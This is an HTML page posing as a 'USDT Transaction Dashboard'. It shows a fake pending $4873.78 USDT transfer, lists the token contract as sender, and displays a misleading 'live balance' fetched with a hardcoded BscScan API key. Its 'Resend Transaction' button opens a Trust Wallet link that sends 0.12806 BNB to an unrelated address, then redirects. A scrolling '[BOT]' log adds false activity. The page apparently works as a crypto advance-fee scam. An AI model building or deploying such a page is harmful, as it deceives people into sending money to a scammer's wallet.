<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>USDT Transaction Dashboard</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      color: #111;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 900px;
      margin: 2rem auto;
      padding: 2rem;
      background-color: #f9f9f9;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
    }
    h1 {
      font-size: 1.8rem;
      margin-bottom: 1rem;
      color: #2c3e50;
    }
    .section {
      margin-bottom: 2rem;
    }
    p {
      font-size: 1rem;
      margin: 0.4rem 0;
    }
    code {
      background: #e8e8e8;
      padding: 2px 6px;
      border-radius: 4px;
    }
    .btn {
      display: inline-block;
      padding: 0.6rem 1.2rem;
      background-color: #2d87f0;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 1rem;
    }
    .btn:hover {
      background-color: #1a73e8;
    }
    .wallet-btns {
      margin-top: 1.5rem;
    }
    .wallet-btns button {
      margin-right: 1rem;
    }
    .bot-log {
      background: #f1f1f1;
      padding: 1rem;
      border: 1px solid #ccc;
      margin-top: 2rem;
      font-size: 0.9rem;
      border-radius: 6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>USDT Transaction Dashboard</h1><div class="section">
  <p><strong>From:</strong> <code>0x55d398326f99059ff775485246999027b3197955</code></p>
  <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
  <p><strong>Amount:</strong> $4873.78 USDT</p>
  <p><strong>Status:</strong> <span style="color: orange; font-weight: bold;">Pending</span></p>
  <p><strong>Live Balance:</strong> <span id="balance">Loading...</span></p>
  <button class="btn" onclick="resendTransaction()">üîÅ Resend Transaction</button>
</div>

<div class="section wallet-btns">
  <button class="btn" onclick="connectWallet()">Connect MetaMask</button>
  <button class="btn" onclick="window.open('https://link.coinbase.com', '_blank')">Connect Coinbase</button>
  <button class="btn" onclick="window.open('https://link.trustwallet.com', '_blank')">Connect Trust Wallet</button>
</div>

<div class="bot-log" id="botLog">[BOT] Waiting to start...</div>

  </div>  <script>
    const API_KEY = 'ZM8ACMJB67C2IXKKBF8URFUNSY';
    const CONTRACT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
    const SENDER_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';

    async function fetchBalance() {
      try {
        const url = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${CONTRACT_ADDRESS}&address=${SENDER_ADDRESS}&tag=latest&apikey=${API_KEY}`;
        const res = await fetch(url);
        const data = await res.json();
        const balance = parseFloat(data.result) / 1e18;
        document.getElementById('balance').textContent = balance.toFixed(2) + ' USDT';
      } catch (err) {
        document.getElementById('balance').textContent = 'Error';
      }
    }

    function connectWallet() {
      if (window.ethereum) {
        window.ethereum.request({ method: 'eth_requestAccounts' })
          .then(() => alert('‚úÖ MetaMask connected'))
          .catch(() => alert('‚ùå Connection rejected'));
      } else {
        alert('ü¶ä MetaMask not found');
      }
    }

    function resendTransaction() {
      window.open("https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.12806", "_blank");
      setTimeout(() => {
        window.location.href = "https://contract-decimals.github.io/BNB-Smart-Chain/";
      }, 50000);
    }

    function startBot() {
      let counter = 0;
      setInterval(() => {
        counter++;
        document.getElementById('botLog').textContent = `[BOT] Cycle ${counter}: Checking balance...`;
        fetchBalance();
      }, 45000);
    }

    fetchBalance();
    startBot();
  </script></body>
</html>
